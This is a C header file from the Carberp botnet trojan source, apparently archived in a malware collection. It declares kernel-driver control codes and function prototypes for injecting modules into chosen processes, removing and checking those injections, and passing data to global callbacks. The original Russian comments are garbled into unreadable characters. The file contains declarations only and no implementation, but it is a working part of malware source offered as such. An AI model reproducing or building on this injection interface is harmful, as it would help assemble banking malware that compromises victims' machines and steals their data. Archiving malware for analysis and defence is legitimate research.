/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef __Driver_Connect___
#define __Driver_Connect___

#define IO_CONTROL_DRIVER_NULL								0
#define IO_CONTROL_DRIVER_LOAD_MODULE						1
#define IO_CONTROL_DRIVER_REMOVE_MODULE						2
#define IO_CONTROL_DRIVER_REGISTER_GLOBALCALLBACK			3
#define IO_CONTROL_DRIVER_SEND_DATA_TO_GLOBALCALLBACK		4
#define IO_CONTROL_DRIVER_CHEK_PROCESS						5


typedef struct __USER_INIT_NOTIFY{
	PVOID pInfoNotifyArea;				//	��������� ���� ���� ������ ������ ��������
	ULONG AreaSize;						//	 ������ �������
	HANDLE hQueryEvent;					// ����� ��� ��������� � ��������
}USER_INIT_NOTIFY,*PUSER_INIT_NOTIFY;

typedef struct __BUFFER_DATA
{
	PVOID	 Buffer;
	ULONG	 Size;
}BUFFER_DATA,*PBUFFER_DATA;

typedef VOID(WINAPI * TGlobalCallBack) (PVOID Reserved,PBUFFER_DATA Data,PVOID lParam);

//
//	puin			- �������� ���������� � ��������� Notify 
//	Module			- ��������� ��� � ������
//  TargetProcess	- ��� �������� � ������� ����� ��������, ���� NULL �� �� ��� ��������.
//  size			- ������ ��� � ������
//  Flags			- ���������������
PVOID DriverAddInjectModule(PUSER_INIT_NOTIFY puin, PVOID Module,PCHAR TargetProcess,ULONG size,ULONG Flags);



//
//  ������� ��������� ������ � �������
//	ProcessName	-	��� ��������
//	���������� TRUE ���� ��� ������.
//
BOOL DriverRemoveInjectToProcess(PUSER_INIT_NOTIFY puin,PWCHAR ProcessName);

//
//	������������ GlobalCallback
//	ThreadId - ����� � ������� ����� �������� CallBack ���������	
//	CallBack - CallBack ���������
//	lParam	 -	�������������� ��������, ���������� � CallBack
BOOL DriverRegisterGlobalCallback (PUSER_INIT_NOTIFY puin ,DWORD ThreadId,TGlobalCallBack CallBack,LPVOID lParam);


//
//	�������� ������ � GlobalCallBack
//	Memory			-	��������� �� ������
//	SizeMemory		-	������ ������
BOOL DriverSendDataToGlobalCallBack(PUSER_INIT_NOTIFY puin, PVOID Memory, ULONG SizeMemory);


//
//	��������� ����� �� ���������� � ��������� �������, ����� ���� ���
//	uProcessName	-	��� ��������
//
BOOL CheckIsInjectToProcess(PUSER_INIT_NOTIFY puin, PWCHAR uProcessName);

#endif